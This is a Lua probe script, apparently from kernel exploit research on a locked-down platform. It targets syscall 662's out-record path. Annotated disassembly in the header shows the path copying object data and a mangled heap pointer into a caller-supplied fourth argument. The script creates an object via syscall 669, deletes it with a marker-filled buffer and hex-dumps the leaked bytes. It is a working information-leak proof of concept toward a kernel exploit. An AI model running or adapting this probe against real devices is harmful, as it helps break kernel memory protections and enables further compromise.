-- CRASH_CLASS: HIGH
-- PROBE 489a: 662 with a 4th argument — the out-record path
-- 13.60 delete body after the lock drop:
--   3afd0c mov rax,[r12+0x28]      ; entry->objects
--   3afd14 mov r14,[rax+rcx*8]     ; object for the slot
--   3afd21 cmp qword [rbx+0x40],0  ; 4th argument (out records) present?
--   3afd2e call 0xb078d0           ; "is this deletable" probe
--   3afd41 jne 0x3afd72            ; if either false, skip the copy
--   3afd5a mov [rdi+rcx*8+8], rax  ; [obj+0x18] -> [obj]
--   3afd6d mov [rdi+rcx*8+0x10], rdx ; ([obj+0x10]^([obj+0x10]>>4)) mangled
-- A non-NULL 4th argument therefore receives up to 0x18 bytes per entry.
print("=== PROBE 489a: 662 out-record ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(buf, n)
    local o = {}
    for i = 0, n - 1 do
        local ok, b = pcall(function() return to_num(memory.read_byte(buf + i)) end)
        if not ok then o[#o + 1] = "??"; break end
        o[#o + 1] = string.format("%02x", b)
    end
    return table.concat(o, " ")
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
local rec  = memory.alloc(0x400)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
for off = 0, 0x400 - 1, 4  do pcall(function() memory.write_dword(rec + off, 0x51515151) end) end
local sc669 = make_syscall(669)
local sc662 = make_syscall(662)
local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
local id = to_num(memory.read_dword(out))
print(string.format("[1] create count=1 ret=%s id=%d", ok and tostring(to_num(rv)) or "-", id))
if id <= 0 then print("=== abort ===") return end
pcall(function() memory.write_dword(ids, id) end)
print("[2] delete(ids, 1, res, rec)")
local ok2, rv2 = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res), uint64(rec)) end)
print(string.format("[2] ret=%s res=%s", ok2 and tostring(to_num(rv2)) or "-", hex(res, 0x10)))
print("[2] rec = " .. hex(rec, 0x40))
print("=== PROBE 489a COMPLETE ===")
